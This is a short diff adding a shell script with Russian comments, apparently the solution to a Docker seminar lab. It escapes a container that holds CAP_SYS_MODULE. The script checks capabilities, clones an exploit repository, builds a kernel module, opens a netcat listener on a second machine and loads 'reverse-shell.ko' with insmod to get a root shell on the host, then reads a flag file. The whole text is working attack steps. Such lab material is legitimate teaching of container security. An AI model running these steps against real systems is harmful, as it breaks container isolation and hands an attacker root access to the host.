@@ -1,0 +1,24 @@
+# Какие у нас capabilities?
+capsh --print
+
+# Есть CAP_SYS_MODULE
+capsh --print | grep -i CAP_SYS_MODULE
+
+# Установим пакеты для сплойта
+dnf install gcc make git kmod
+
+# Загрузим сплойт
+git clone https://github.com/lololozhkin/docker-seminar.git
+cd ./docker-seminar/practice/03_sys-module/sploit
+
+# Скомпилируем модуль ядра
+make
+
+# На другой машинке откроем на прослушивание порт
+nc -lp 13337
+
+# Загрузим модуль в ядро
+insmod reverse-shell.ko
+
+# На второй машинке получили доступ к башу на хосте, делаем что захотим
+cat /root/docker-seminar/practice/03_sys-module/flag
